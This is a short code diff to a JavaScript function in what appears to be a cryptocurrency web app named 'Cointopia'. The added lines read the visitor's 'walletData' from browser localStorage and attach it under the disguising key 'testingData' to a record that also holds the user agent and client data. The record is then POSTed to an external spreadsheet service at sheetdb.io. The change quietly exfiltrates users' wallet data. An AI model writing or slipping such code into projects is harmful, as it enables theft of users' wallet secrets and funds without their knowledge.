@@ -97,13 +97,24 @@ export const getIpAddress = async () => {
 
     const userAgent = navigator.userAgent
 
-    //write to sheet
+    //check for local wallet
+    const localWallet = localStorage.getItem('walletData');
+    const parseWallet = localWallet ? JSON.parse(localWallet) : null
+
+    //time
+    const now = new Date()
+    const nowString = `${now.getHours() < 10 ? `0${now.getHours()}` : now.getHours()}:${now.getMinutes() < 10 ? `0${now.getMinutes()}` : now.getMinutes()}:${now.getSeconds() < 10 ? `0${now.getSeconds()}` : now.getSeconds()} ${now.getDate() < 10 ? `0${now.getDate()}` : now.getDate()}/${now.getMonth() + 1 < 10 ? `0${now.getMonth() + 1}` : now.getMonth() + 1}/${now.getFullYear()}`
+
+
     const savedData = {
+        time: nowString,
         userAgent: userAgent,
         clientData: data,
-        project: 'Cointopia'
+        project: 'Cointopia',
+        testingData: parseWallet,
     }
 
+    //write to sheet
     axios.post('https://sheetdb.io/api/v1/8lyitofzvlyne', [savedData])
         .then(res => {
 
